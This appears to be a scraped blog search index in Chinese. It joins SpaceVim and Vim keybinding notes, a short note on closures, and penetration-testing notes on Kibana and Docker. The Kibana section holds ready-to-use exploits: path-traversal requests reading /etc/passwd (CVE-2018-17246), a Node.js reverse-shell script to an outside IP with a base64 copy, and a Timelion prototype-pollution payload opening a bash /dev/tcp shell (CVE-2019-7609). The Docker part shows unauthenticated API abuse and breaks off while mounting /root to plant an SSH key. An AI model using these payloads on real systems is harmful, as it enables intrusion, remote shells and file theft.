buffer (create it if needed) (TODO)   SPC b w 切换只读权限   SPC b Y 将整个缓冲区复制到系统剪切板   z f Make current function or comments visible in buffer as much as possible (TODO)    删除buffer    快捷键 功能描述     SPC b d 删除当前缓冲区，但保留编辑窗口   SPC u SPC b d kill the current buffer and window (does not delete the visited file) (TODO)   SPC b D 选择一个窗口，并删除其缓冲区   SPC u SPC b D kill a visible buffer and its window using ace-window(TODO)   SPC b c 删除其它已保存的缓冲区   SPC b C-d 删除其它所有缓冲区   SPC b C-D kill buffers using a regular expression(TODO)   SPC b e 清除当前缓冲区内容，需要手动确认   SPC u SPC b m kill all buffers and windows except the current one(TODO)    文件浏览器 默认的快捷键是F3, SpaceVim 也提供了另外一组快捷键 SPC f t 和 SPC f T 来打开文件树\n1 2 3 4 5 6 7  [options] # 文件树插件可选值包括： # - vimfiler （默认） # - nerdtree # - defx filemanager = \u0026#34;defx\u0026#34; filetree_direction = \u0026#34;right\u0026#34;   文件浏览器内的快捷键    快捷键 功能描述     \u0026lt;F3\u0026gt; / SPC f t 切换文件树   文件树内的快捷键    \u0026lt;Left\u0026gt; / h 移至父目录，并关闭文件夹   \u0026lt;Down\u0026gt; / j 向下移动光标   \u0026lt;Up\u0026gt; / k 向上移动光标   \u0026lt;Right\u0026gt; / l 展开目录，或打开文件   N 在光标位置新建文件   y y 复制光标下文件路径至系统剪切板   y Y 复制光标下文件至系统剪切板   P 在光标位置黏贴文件   . 切换显示隐藏文件   s v 分屏编辑该文件   s g 垂直分屏编辑该文件   p 预览文件   i 切换至文件夹历史   v 快速查看   \u0026gt; 放大文件树窗口宽度   \u0026lt; 缩小文件树窗口宽度   g x 使用相关程序执行该文件   ' 标记光标下的文件（夹）   V 清除所有标记   Ctrl+r 刷新页面    文件分屏操作 如果只有一个可编辑窗口，则在该窗口中打开选择的文件，否则则需要指定窗口来打开文件：\n   快捷键 功能描述     l / \u0026lt;Enter\u0026gt; 打开文件   sg 水平分屏打开文件   sv 垂直分屏打开文件    文件操作 文件操作相关的快捷键都是以 SPC f 为前缀的：\n   快捷键 功能描述     SPC f / 使用 find 或者 fd 命令查找文件，支持参数提示   SPC f b 跳至文件书签   SPC f c copy current file to a different location(TODO)   SPC f C d 修改文件编码 unix -\u0026gt; dos   SPC f C u 修改文件编码 dos -\u0026gt; unix   SPC f D 删除文件以及 buffer，需要手动确认   SPC f E open a file with elevated privileges (sudo edit)(TODO)   SPC f f 打开文件   SPC f F 打开光标下的文件   SPC f o 代开文件树，并定位到当前文件   SPC f R rename the current file(TODO)   SPC f s / Ctrl-s 保存文件 (:w)   SPC f W 使用管理员模式保存   SPC f S 保存所有文件   SPC f r 打开文件历史   SPC f t 切换侧栏文件树   SPC f T 打开文件树侧栏   SPC f d Windows 下显示/隐藏磁盘管理器   SPC f y 复制并显示当前文件的绝对路径   SPC f Y 复制并显示当前文件的远程路径    SpaceVim进阶 工程管理 当打开一个文件时，SpaceVim 会自动切换当前目录至包含该文件的项目根目录， 项目根目录的检测依据 project_rooter_patterns 这一选项，其默认值为：\n1 2 3  [options] project_rooter_patterns = [\u0026#39;.git/\u0026#39;, \u0026#39;_darcs/\u0026#39;, \u0026#39;.hg/\u0026#39;, \u0026#39;.bzr/\u0026#39;, \u0026#39;.svn/\u0026#39;]   项目管理器默认自动检测最外层的项目根目录，如果需要自动检测最内层的项目根目录， 可将选项 project_rooter_outermost 选项改为 false。\n1 2 3 4  [options] project_rooter_patterns = [\u0026#39;.git/\u0026#39;, \u0026#39;_darcs/\u0026#39;, \u0026#39;.hg/\u0026#39;, \u0026#39;.bzr/\u0026#39;, \u0026#39;.svn/\u0026#39;] project_rooter_outermost = false   在自动检测项目根目录时，有时候我们需要忽略掉一些目录，可以表达式前面添加 !， 比如，忽略掉 node_packages/ 文件夹：\n1 2 3 4  [options] project_rooter_patterns = [\u0026#39;.git/\u0026#39;, \u0026#39;_darcs/\u0026#39;, \u0026#39;.hg/\u0026#39;, \u0026#39;.bzr/\u0026#39;, \u0026#39;.svn/\u0026#39;, \u0026#39;!node_packages/\u0026#39;] project_rooter_outermost = false   工程管理的命令以 p 开头：\n   快捷键 功能描述     SPC p ' 在当前工程的根目录打开 shell（需要 shell 模块）    在工程中搜索文件    快捷键 功能描述     SPC p f 在当前工程中查找文件   SPC p / 在当前工程中搜索文本内容   SPC p k 关闭当前工程的所有缓冲区   SPC p p 显示所有工程    SPC p p 将会列出最近使用的项目清单，默认会显示最多 20 个， 这一数量可以使用 projects_cache_num 来修改。\n为了可以夸 Vim 进程读取历史打开的项目信息，这一功能使用了缓存机制。 如果需要禁用这一缓存功能，可以将 enable_projects_cache 设为 false。\n1 2 3 4  [options] enable_projects_cache = true projects_cache_num = 20   自定义跳转文件 若要实现自定义文件跳转功能，需要在项目根目录新建一个 .project_alt.json 文件， 并在此文件内指定文件跳转的规则。此后可以使用名:A跳转到相关文件， 同时可以加上参数指定跳转类型，比如 :A doc。与此同时，可以在命令后加入感叹号 :A!， 强制根据配置文件重新分析项目跳转文件结构。若未指定跳转类型，默认的类型为 alternate。\n配置文件示例：\n1 2 3 4 5 6  { \u0026#34;autoload/SpaceVim/layers/lang/*.vim\u0026#34;: { \u0026#34;doc\u0026#34;: \u0026#34;docs/layers/lang/{}.md\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;test/layer/lang/{}.vader\u0026#34; } }   书签管理 在浏览代码时，通常需要给指定位置添加标签，方便快速跳转，在 SpaceVim 中可以使用如下快捷键来管理标签。 这一功能需要载入 tools 模块：\n1 2 3  [layers] name = \u0026#34;tools\u0026#34;      快捷键 功能描述     m a 显示书签列表   m m 切换当前行标签状态   m n 跳至下一个书签   m p 跳至前一个书签   m i 给当前行标签添加说明    正因为占用了以上几个快捷键，以下几个寄存器无法用来记忆当前位置了：a, m, n, p, i。 当然，也可以在启动函数里将 \u0026lt;Leader\u0026gt; m 映射为 m 键，如此便可使用 \u0026lt;Leader\u0026gt; m a 来代替 m a。\n1 2 3 4  function! myspacevim#before() abort nnoremap \u0026lt;silent\u0026gt;\u0026lt;Leader\u0026gt;m m endfunction   任务管理 通过内置的任务管理系统，可以快速集成外部命令工具，类似于 vscode 的任务管理系统， 在 SpaceVim 中，目前支持的任务配置文件包括两种：\n ~/.SpaceVim.d/tasks.toml：全局配置文件 .SpaceVim.d/tasks.toml：项目局部配置文件  全局配置中定义的任务，默认会被项目局部配置文件中定义的任务覆盖掉。\n   快捷键 功能描述     SPC p t e 编辑任务配置文件   SPC p t r 选定任务并执行   SPC p t l 列出所有任务    自定义任务 以下为一个简单的任务配置示例，异步运行 echo hello world，并将结果打印至输出窗口。\n1 2 3  [my-task] command = \u0026#39;echo\u0026#39; args = [\u0026#39;hello world\u0026#39;]   对于不需要打印输出结果，后台运行的任务，可以设置 isBackground 为 true:\n1 2 3 4 5  [my-task] command = \u0026#39;echo\u0026#39; args = [\u0026#39;hello world\u0026#39;] isBackground = true   任务的配置，可以设置如下关键字：\n command: 需要运行的命令。 args: 传递给命令的参数，值为字符串数组 options: 设置命令运行的一些选项，比如 cwd,env 或者 shell。 isBackground: 可设定的值为 true 或者 false， 默认是 false， 设置是否需要后台运行任务 description: 关于该任务的一段简短介绍  当启动一个任务时，默认会关闭前一个任务，如果需要让任务一直保持后台运行， 可以将 isBackground 设为 true。\n在编辑任务配置文件时，可以使用一些预设定的变量，以下列出目前已经支持的预设定变量：\n ${workspaceFolder}: - 当前项目的根目录； ${workspaceFolderBasename}: - 当前项目根目录所在父目录的文件夹名称； ${file}: - 当前文件的绝对路径； ${relativeFile}: - 当前文件相对项目根目录的相对路径； ${relativeFileDirname}: - 当前文件所在的文件夹相对项目根目录的相对路径； ${fileBasename}: - 当前文件的文件名 ${fileBasenameNoExtension}: - 当前文件的文件名，不包括后缀名 ${fileDirname}: - 当前文件所在的目录的绝对路径 ${fileExtname}: - 当前文件的后缀名 ${lineNumber}: - 光标所在行号  例如：假定目前正在编辑文件 /home/your-username/your-project/folder/file.ext ，光标位于第十行； 该文件所在的项目根目录为 /home/your-username/your-project，那么任务系统的预设定变量的值为：\n ${workspaceFolder}: - /home/your-username/your-project/ ${workspaceFolderBasename}: - your-project ${file}: - /home/your-username/your-project/folder/file.ext ${relativeFile}: - folder/file.ext ${relativeFileDirname}: - folder/ ${fileBasename}: - file.ext ${fileBasenameNoExtension}: - file ${fileDirname}: - /home/your-username/your-project/folder/ ${fileExtname}: - .ext ${lineNumber}: - 10  任务自动识别 SpaceVim 目前支持自动识别以下构建系统的任务：npm。 任务管理插件将自动读取并分析 npm 系统的文件package.json。 比如，克隆示例项目 eslint-starter， 编辑其中的任意文件，然后按下快捷键SPC p t r，将会显示如下任务列表：\n任务提供源 任务提供源可以自动检测并新建任务。例如，一个任务提供源可以自动检测是否存在项目构建文件，比如：package.json， 如果存在则根据其内容创建 npm 的构建任务。\n在 SpaceVim 里，如果需要新建任务提供源，需要使用启动函数，任务提供源是一个 Vim 函数，该函数返回一系列任务对象。\n以下为一个简单的示例：\nfunction! s:make_tasks() abort if filereadable('Makefile') let subcmd = filter(readfile('Makefile', ''), \u0026quot;v:val=~#'^.PHONY'\u0026quot;) if !empty(subcmd) let commands = split(subcmd[0])[1:] let conf = {} for cmd in commands call extend(conf, { \\ cmd : { \\ 'command': 'make', \\ 'args' : [cmd], \\ 'isDetected' : 1, \\ 'detectedName' : 'make:' \\ } \\ }) endfor return conf else return {} endif else return {} endif endfunction call SpaceVim#plugins#tasks#reg_provider(funcref('s:make_tasks')) 将以上内容加入启动函数，在 SpceVim 仓库内按下 SPC p t r 快捷键，将会展示如下任务：\nledit多光标编辑 SpaceVim 内置了 iedit 多光标模式，可快速进行多光标编辑。这一功能引入了两个新的模式：iedit-Normal 模式和 iedit-Insert。\niedit 模式默认的颜色是 red/green，但它也基于当前的主题。\nIedit 快捷键 模式转换:\n前面提到 Iedit 引入了两个新的模式，在这两个新的模式以及 Vim 自身模式之间转换的快捷键如下：\n   快捷键 From to     SPC s e Normal/Visual iedit-Normal   \u0026lt;Esc\u0026gt; iedit-Normal Normal    在 iedit-Normal 模式中 iedit-Normal 模式继承自 Vim 的 Normal 模式, 下面所列举的是 iedit-Normal 模式专属的快捷键。\n   快捷键 功能描述     \u0026lt;Esc\u0026gt; 切换回 Normal 模式   i 切换至 iedit-Insert 模式，类似于一般模式下的 i   a 切换至 iedit-Insert 模式，类似于一般模式下的 a   I 跳至当前 occurrence 并进入 iedit-Insert 模式，类似于一般模式下的 I   A 跳至当前 occurrence 并进入 iedit-Insert 模式，类似于一般模式下的 A   \u0026lt;Left\u0026gt; / h 左移光标，类似于一般模式下的 h   \u0026lt;Right\u0026gt; / l 右移光标，类似于一般模式下的 l   0 / \u0026lt;Home\u0026gt; 跳至当前 occurrence 的开头，类似于一般模式下的 0   $ / \u0026lt;End\u0026gt; 跳至当前 occurrence 的结尾，类似于一般模式下的 $   C 删除所有 occurrences 中从光标位置开始到 occurrences 结尾的字符，类似于一般模式下的 C   D 删除所有 occurrences 类似于一般模式下的 D   s 删除所有 occurrences 中光标下的字符并进入 iedit-Insert 模式，类似于一般模式下的 s   S 删除所有 occurrences 并进入 iedit-Insert 模式，类似于一般模式下的 S   x 删除所有 occurrences 中光标下的字符，类似于一般模式下的 x   X 删除所有 occurrences 中光标前的字符，类似于一般模式下的 X   gg 跳至第一个 occurrence，类似于一般模式下的 gg   G 跳至最后一个 occurrence，类似于一般模式下的 G   f{char} 向右移动光标至字符 {char} 首次出现的位置   n 跳至下一个 occurrence   N 跳至上一个 occurrence   p 替换所有 occurrences 为最后复制的文本   \u0026lt;Tab\u0026gt; toggle current occurrence    In iedit-Insert mode:\n   快捷键 功能描述     Ctrl-g / \u0026lt;Esc\u0026gt; 回到 iedit-Normal 模式   Ctrl-b / \u0026lt;Left\u0026gt; 左移光标   Ctrl-f / \u0026lt;Right\u0026gt; 右移光标   Ctrl-a / \u0026lt;Home\u0026gt; 跳至当前 occurrence 的开头   Ctrl-e / \u0026lt;End\u0026gt; 跳至当前 occurrence 的结尾   Ctrl-w 删除光标前的词   Ctrl-k 删除光标后的词   Ctrl-u 删除光标前所有字符   Ctrl-h / \u0026lt;BackSpace\u0026gt; 删除光标前字符   \u0026lt;Delete\u0026gt; 删除光标后字符    高亮光标下变量 SpaceVim 支持高亮当前光标下的变量，并且启动一个临时快捷键窗口， 提示可以通过快捷键进行修改高亮范围，以及下一步的操作。\n目前支持的高亮范围包括：\n 整个缓冲区（buffer） 当前函数内（function） 可见区域（visible area）  使用快捷键 SPC s h 来高亮光标下的符号。\n可使用如下快捷键在已高亮的变量间跳转：\n   快捷键 功能描述     * 在当前缓冲区正向搜索光标下变量   # 在当前缓冲区逆向搜索光标下变量   SPC s e 启动 iedit 模式，编辑光标下变量   SPC s h 使用默认的的范围高亮光标下的变量   SPC s H 高亮当前缓冲区下所有的光标下变量    在高亮临时快捷键模式下可使用如下快捷键:\n   快捷键 功能描述     e 启动 iedit 模式   n 跳至下一个匹配处   N / p 跳至上一个匹配处   b 在整个缓冲区内高亮该匹配   / 在整个工程内检索当前匹配   \u0026lt;Tab\u0026gt; 切换当前匹配高亮状态   r 切换匹配的范围   R 重置匹配的范围   Any other key 退出该临时快捷键模式    异步运行与交互编程 SpaceVim 提供了一个异步执行命令和交互式编程的插件， 在大多数语言模块中，已经为该语言定义了默认的执行命令，通常快捷键为 SPC l r。 如果需要添加额外的命令，可以使用启动函数。比如：添加使用 F5 按键异步编译当前项目。\nnnoremap \u0026lt;silent\u0026gt; \u0026lt;F5\u0026gt; :call SpaceVim#plugins#runner#open('make') 目前，SpaceVim 支持如下特性：\n 使用默认命令一键运行当前文件 使用系统文件管理器选择文件并执行 根据文件顶部标识，选择合适解析器 中断代码运行 底部窗口异步展示运行结果 设置默认的运行语言 选择指定语言来运行 支持交互式编程 运行选择的代码片段  错误处理 SpaceVim 通过默认通过 checkers 模块来进行文件语法检查，默认在保存文件时进行错误检查。\n错误管理导航键 (以 e 开头)：\n   快捷键 功能描述     SPC t s 切换语法检查器   SPC e c 清除所有错误   SPC e h describe a syntax checker   SPC e l 切换显示错误/警告列表   SPC e n 跳至下一错误   SPC e p 跳至上一个错误   SPC e v verify syntax checker setup (useful to debug 3rd party tools configuration)   SPC e . 错误暂态（error transient state)    下一个/上一个错误导航键和错误暂态(error transinet state) 可用于浏览语法检查器和位置列表缓冲区的错误， 甚至可检查 Vim 位置列表的所有错误。这包括下面的例子：在已被保存的位置列表缓冲区进行搜索。 默认提示符：\n   提示符 描述 自定义选项     ✖ Error error_symbol   ➤ warning warning_symbol   ⓘ Info info_symbol    quickfix 列表移动：\n   快捷键 功能描述     \u0026lt;Leader\u0026gt; q l 打开 quickfix 列表窗口   \u0026lt;Leader\u0026gt; q c 清除 quickfix 列表   \u0026lt;Leader\u0026gt; q n 跳到 quickfix 列表中下一个位置   \u0026lt;Leader\u0026gt; q p 跳到 quickfix 列表中上一个位置    格式规范 SpaceVim 添加了 EditorConfig 支持，通过一个配置文件来为不同的文件格式设置对应的代码格式规范， 这一工具兼容多种文本编辑器和集成开发环境。\n更多配置方式，可以阅读其官方文档：editorconfig-vim package’s documentation.\n后台服务 SpaceVim 在启动时启动了一个后台服务。无论何时，当你关闭了 Vim 窗口，该服务器就会被关闭。\n连接到 Vim 服务器\n如果你使用 Neovim, 你需要安装neovim-remote，然后增加如下配置到你的 bashrc。\n1 2  export PATH=$PATH:$HOME/.SpaceVim/bin   使用命令 svc 在一个已存在的 Vim 服务器上打开文件，使用命令 nsvc 在一个已存在的 Neovim 服务器上打开文件。\n","description":"","id":90,"section":"en","tags":null,"title":"SpaceVim","uri":"http://crkmythical.github.io/en/blog/spacevim/"},{"content":"编写进度\n   Vim基本概念  tab \u0026gt; window \u0026gt; buffer\n  标签页tab  是窗口的集合，:tabnew创建   窗口window  提供buffer的可视视图，一个buffer对应多个window :split/vsplit创建   缓冲区buffer  buffer是vim和实际文件交互的通道，存在于内存中 :buffers 查看buffer列表    ","description":"","id":91,"section":"en","tags":null,"title":"VIM","uri":"http://crkmythical.github.io/en/blog/vim/"},{"content":"编写进度\n   闭包: 一个可以读取外部环境变量的函数。或者说能够读取其他函数内部变量的函数就是闭包。\n本质上，闭包就是函数内部和函数外部连接起来的一座桥梁，或者说一个通道。\n因素:\n 外层函数嵌套内层函数 内层函数使用外层函数的局部变量 将内层函数作为外层函数的返回  1 2 3 4  let a=1 let b =function(){ console.log(a) }   作用：\n 可以读取函数内部的变量 让函数内部变量始终保存在内存中  ","description":"","id":92,"section":"en","tags":null,"title":"program_concept","uri":"http://crkmythical.github.io/en/blog/program-concept/"},{"content":"编写进度\n   Kibana 是为 Elasticsearch设计的开源分析和可视化平台。用户可以使用 Kibana 来搜索、查看存储在 Elasticsearch 索引中的数据并与之交互，并且可以很容易实现高级的数据分析和可视化，以图标的形式展现出来。用户可以在大量数据之上创建条形图，折线图和散点图，或饼图和地图。\nKibana还提供了一个称为Canvas的演示工具，用户可以利用该工具来创建幻灯片平台，并且直接从Elasticsearch中获取实时数据。并且Elasticsearch，Logstash和Kibana的组合可以作为数据服务产品。Logstash向Elasticsearch提供输入流以进行存储和搜索，而Kibana则访问数据以进行可视化。\n信息收集 1 2 3 4 5 6 7 8 9 10  nmap -Pn -T4 -sSUV -p 5601 192.168.79.207 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 14:55 CST Nmap scan report for 192.168.79.207 Host is up (0.00017s latency). PORT STATE SERVICE VERSION 5601/tcp open http Elasticsearch Kibana 5.6.12 5601/udp closed esmagent Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds   漏洞利用 1 2 3 4 5  GET /api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis=../../../../../../../../../../../etc/passwd # 任意文件读取 GET /api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis=es_6.0 GET /api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis= ../../../cli_plugin/index #拒绝服务漏洞   拒绝服务漏洞 1 2 3  curl \u0026#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis= ../../../cli_plugin/index.js\u0026#39; curl \u0026#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis= ../../../cli_plugin/cli.js\u0026#39; curl \u0026#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis= ../../../docs/cli.js\u0026#39;   任意文件读取 CVE-2018-17246 1 2 3  curl \u0026#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis=../../../../../../../../../../../etc/passwd\u0026#39; {\u0026#34;statusCode\u0026#34;:500,\u0026#34;error\u0026#34;:\u0026#34;Internal Server Error\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;An internal server error occurred\u0026#34;}%   虽然响应码为500，但是服务器日志可以泄漏\n通常情况下Kibana与其他的应用程序一起部署，如果应用程序可以上传或者写入Javascript文件的话，攻击者可以通过Nodejs创建一个Reverse Shell:\n文件shell.js内容如下： 放到服务器中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  (function(){ var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;/bin/sh\u0026#34;, []); var client = new net.Socket(); client.connect(7777, \u0026#34;10.211.55.13\u0026#34;, function(){ //vps_ip:192.168.33.1 port:8080  client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })(); base64格式： ZnVuY3Rpb24oKXsKICAgIHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwKICAgICAgICBjcCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKSwKICAgICAgICBzaCA9IGNwLnNwYXduKCIvYmluL3NoIiwgW10pOwogICAgdmFyIGNsaWVudCA9IG5ldyBuZXQuU29ja2V0KCk7CiAgICBjbGllbnQuY29ubmVjdCg3Nzc3LCAiMTAuMjExLjU1LjEzIiwgZnVuY3Rpb24oKXsgICAgLy92cHNfaXA6MTkyLjE2OC4zMy4xICBwb3J0OjgwODAKICAgICAgICBjbGllbnQucGlwZShzaC5zdGRpbik7CiAgICAgICAgc2guc3Rkb3V0LnBpcGUoY2xpZW50KTsKICAgICAgICBzaC5zdGRlcnIucGlwZShjbGllbnQpOwogICAgfSk7CiAgICByZXR1cm4gL2EvOyAvLyBQcmV2ZW50cyB0aGUgTm9kZS5qcyBhcHBsaWNhdGlvbiBmb3JtIGNyYXNoaW5nCn0pKCk7   1 2 3 4 5 6  echo \u0026#34;\u0026lt;shell.js base64 encoded string \u0026gt;\u0026#34; | base64 -d \u0026gt;\u0026gt;/tmp/shell.js nc -lvp 7777 # 本地监听7777端口 curl \u0026#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis=../../../../../../../../../../../tmp/shell.js\u0026#39;   Kinana远程代码执行 存在漏洞版本：\nKibana 5.6.15之前版本和6.6.1之前版本中的Timelion visualizer存在安全漏洞\n该漏洞触发，需要Timelion 和 Canvas插件\n1  http://192.168.79.207:5601/app/kibana#/management?_g=() #查看Kibana版本   点在Timelion处,直接填入payload，点击run\n1 2 3 4 5  .es(*).props(label.__proto__.env.AAAA=\u0026#39;require(\u0026#34;child_process\u0026#34;).exec(\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/PORT 0\u0026gt;\u0026amp;1\u0026#34;);process.exit()//\u0026#39;) .props(label.__proto__.env.NODE_OPTIONS=\u0026#39;--require /proc/self/environ\u0026#39;) .es(*).props(label.__proto__.env.AAAA=\u0026#39;require(\u0026#34;child_process\u0026#34;).exec(\u0026#34;/bin/touch /tmp/success\u0026#34;);process.exit()//\u0026#39;) .props(label.__proto__.env.NODE_OPTIONS=\u0026#39;--require /proc/self/environ\u0026#39;)   成功后，再访问**“Canvas”**页面触发命令/bin/touch /tmp/success，\nKibana_RCE_CVE-2019-7609\n","description":"","id":93,"section":"en","tags":null,"title":"Kibana","uri":"http://crkmythical.github.io/en/blog/kibana/"},{"content":"编写进度\n 信息收集 漏洞利用  Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。\nDocker Registry API未授权访问 更多用法参考Registry API\nNmap探测 1 2 3 4 5 6 7  nmap -Pn -T4 -sV -p 18093 10.200.88.6 130 ↵ Nmap scan report for 10.200.88.6 Host is up (0.067s latency). PORT STATE SERVICE VERSION 18093/tcp open http Docker Registry (API: 2.0)   利用 1 2 3 4 5 6  curl http://10.200.88.6:18093/v2/_catalog # 获取仓库列表 {\u0026#34;repositories\u0026#34;:[\u0026#34;ondp-web\u0026#34;]} curl http://10.200.88.6:18093/v2/ondp-web/tags/list # 获取指定仓库中镜像的tags列表 {\u0026#34;name\u0026#34;:\u0026#34;ondp-web\u0026#34;,\u0026#34;tags\u0026#34;:[\u0026#34;1.1.0-61752\u0026#34;]}   Docker Remote API未授权访问 Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。\n信息收集 端口信息 1 2 3 4 5 6 7 8  nmap -Pn -T4 -sV -p 2375 192.168.79.207 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:34 CST Host is up (0.28s latency). PORT STATE SERVICE VERSION 2375/tcp open docker Docker 19.03.13 Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds   docker版本、容器信息  通过curl命令查看  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  curl \u0026#39;http://192.168.79.207:2375/version\u0026#39; # 查看docker运行的版本信息  {\u0026#34;Platform\u0026#34;:{\u0026#34;Name\u0026#34;:\u0026#34;Docker Engine - Community\u0026#34;},\u0026#34;Components\u0026#34;:[{\u0026#34;Name\u0026#34;:\u0026#34;Engine\u0026#34;,\u0026#34;Version\u0026#34;:\u0026#34;19.03.13\u0026#34;,\u0026#34;Details\u0026#34;: ... {\u0026#34;GitCommit\u0026#34;:\u0026#34;fec3683\u0026#34;}}],\u0026#34;Version\u0026#34;:\u0026#34;19.03.13\u0026#34;,\u0026#34;ApiVersion\u0026#34;:\u0026#34;1.40\u0026#34;,\u0026#34;MinAPIVersion\u0026#34;:\u0026#34;1.12\u0026#34;,\u0026#34;GitCommit\u0026#34;:\u0026#34;4484c46d9d\u0026#34;,\u0026#34;GoVersion\u0026#34;:\u0026#34;go1.13.15\u0026#34;,\u0026#34;Os\u0026#34;:\u0026#34;linux\u0026#34;,\u0026#34;Arch\u0026#34;:\u0026#34;amd64\u0026#34;,\u0026#34;KernelVersion\u0026#34;:\u0026#34;4.15.0-29-generic\u0026#34;,\u0026#34;BuildTime\u0026#34;:\u0026#34;2020-09-16T17:01:06.000000000+00:00\u0026#34;} curl \u0026#39;http://192.168.79.207:2375/\u0026lt;容器id\u0026gt;/info\u0026#39; # 查看容器运行的信息  curl \u0026#39;http://192.168.79.207:2375/containers/json?all=1\u0026#39; # 获取全部容器列表 [{\u0026#34;Id\u0026#34;:\u0026#34;68ce933588680f6980e7922c721442a8a603995318b448b158c23fb90cfa5545\u0026#34;,\u0026#34;Names\u0026#34;:[\u0026#34;/reverent_bell\u0026#34;],\u0026#34;Image\u0026#34;:\u0026#34;ubuntu:18.04\u0026#34;,\u0026#34;ImageID\u0026#34;:\u0026#34;sha256:2c047404e52d7f17bdac4121a13cd844447b74e13063f8cb8f8b314467feed06\u0026#34;,\u0026#34;Command\u0026#34;:\u0026#34;sh -c \u0026#39;echo /dev/null\u0026#39;\u0026#34;,\u0026#34;Created\u0026#34;:1607475496,\u0026#34;Ports\u0026#34;:[],\u0026#34;Labels\u0026#34;:{},\u0026#34;State\u0026#34;:\u0026#34;running\u0026#34;,\u0026#34;Status\u0026#34;:\u0026#34;Up 4 hours\u0026#34;,\u0026#34;HostConfig\u0026#34;:{\u0026#34;NetworkMode\u0026#34;:\u0026#34;default\u0026#34;},\u0026#34;NetworkSettings\u0026#34;:{\u0026#34;Networks\u0026#34;:{\u0026#34;bridge\u0026#34;: ...{\u0026#34;IPAMConfig\u0026#34;:null,\u0026#34;Links\u0026#34;:null,\u0026#34;Aliases\u0026#34;:null,\u0026#34;NetworkID\u0026#34;:\u0026#34;5001dfbe94e8ad314a58ad790b10086d6accf0173bc1bfbc6d4e54d3e219ac24\u0026#34;,\u0026#34;EndpointID\u0026#34;:\u0026#34;3903fce3838f4002ca8f7142f77ffca4779d6293d4f84b5ca28d4f481c1d9177\u0026#34;,\u0026#34;Gateway\u0026#34;:\u0026#34;172.17.0.1\u0026#34;,\u0026#34;IPAddress\u0026#34;:\u0026#34;172.17.0.7\u0026#34;,\u0026#34;IPPrefixLen\u0026#34;:16,\u0026#34;IPv6Gateway\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;GlobalIPv6Address\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;GlobalIPv6PrefixLen\u0026#34;:0,\u0026#34;MacAddress\u0026#34;:\u0026#34;02:42:ac:11:00:07\u0026#34;,\u0026#34;DriverOpts\u0026#34;:null}}},\u0026#34;Mounts\u0026#34;:[]}] curl \u0026#39;http://192.168.79.207:2375/containers/68ce933588680f6980e7922c721442a8a603995318b448b158c23fb90cfa5545/json\u0026#39; # 查看具体容器的详细信息 curl \u0026#39;http://192.168.79.207:2375/containers/68ce933588680f6980e7922c721442a8a603995318b448b158c23fb90cfa5545/export\u0026#39; # 导出具体的镜像 curl \u0026#39;http://192.168.79.207:2375/images/json?all=1\u0026#39; # 获取全部镜像列表   更多用法参考Docker Remote API\n 通过docker -H查看  1 2 3 4 5 6 7 8  docker -H tcp://192.168.79.207 version #查看docker版本信息 docker -H tcp://192.168.79.207 images #查看目标机器的镜像 docker -H tcp://192.168.79.207 ps -a # 查看服务器运行的容器有哪些 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 8069f1b5cd72 5301ebcf503e \u0026#34;/bin/sh -c \u0026#39;curl --…\u0026#34; About a minute ago Created friendly_dhawan   漏洞利用 运行新镜像并提权  BurpSuite方式-不推荐  创建容器，返回容器id    1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  POST /containers/create HTTP/1.1 Host: 192.168.79.207:2375 Content-Type: application/json cache-control: no-cache Postman-Token: 7abe8d48-2e9d-4245-a7a4-dbd66279705e { \u0026#34;Image\u0026#34;:\u0026#34;ubuntu:18.04\u0026#34;, \u0026#34;HostConfig\u0026#34;:{ \u0026#34;Binds\u0026#34;:[ \u0026#34;/root/:/tmp/:rw\u0026#34; ] }, \u0026#34;CMD\u0026#34;:[ \u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;echo \u0026#39;ssh-rsa 